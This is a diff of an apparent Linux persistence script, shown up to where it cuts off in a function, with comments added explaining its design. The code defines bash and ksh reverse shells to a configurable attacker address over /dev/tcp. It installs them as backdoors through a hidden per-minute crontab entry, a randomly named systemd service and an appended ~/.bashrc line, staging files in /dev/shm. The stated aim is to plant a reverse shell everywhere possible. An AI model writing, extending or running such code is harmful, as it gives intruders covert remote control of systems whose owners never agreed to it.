@@ -1,27 +1,38 @@
 #!/bin/bash
 
 # Modular version
+
+# The basic idea is that you have commands that can execute reverse shells (methods, e.g. bash) and ways to make those shells persist on the system (doors, e.g. crontab)
+# The script will enumerate all methods available and for each, enumerate all doors
+# The goal is to eventually make it to where it will install a reverse shell everywhere it can for each method, with an option to do a dry run and not install anything, just enumerate everything
+
 attackBox=0.0.0.0
 attackPort=5253
 cron="* * * * *"
-payload=tmpayload
 
 touch /dev/shm/.linpay
 
 methods=(
-	# method, eval statement, payload
+	# array entry format = method, eval statement, payload
+	# method = command that starts the reverse shell
+	# eval statement = if return true, then we can do what we want with the command
+	# NOTE: the eval statement is meant to account for the times where you can execute a command, therefore the exit status = 0 but the command itself prevents you from doing what you want (e.g. you can excute easy_install as any user but only install things as root [by default], and you can install a persistence script)
+	# payload = just the bare minimum to run the reverse shell, the extra needed to install the payload somewhere (e.g. cron schedule) is handled in "doors"
 	"ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"bash,if bash -c 'exit',bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 )
 
 doors=(
-	# door, eval statement, hinge
+	# array entry format = door, eval statement, hinge
+	# door = command
+	# eval statement = same as above
+	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
 	"crontab,if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron,echo \"$cron $(cat /dev/shm/.linpay)\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:" 
 	"systemctl,if touch /etc/systemd/.temp; rm /etc/systemd/.temp,export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
 	"bashrc,if cd;find -writable -name .bashrc | grep -qi bashrc,echo \"$(cat /dev/shm/.linpay) 2> /dev/null & sleep .0001\" >> ~/.bashrc"
 )
 
-#return method and payload of available
+# pass paylod to doors
 enum_methods() {
 	
 	IFS=":"
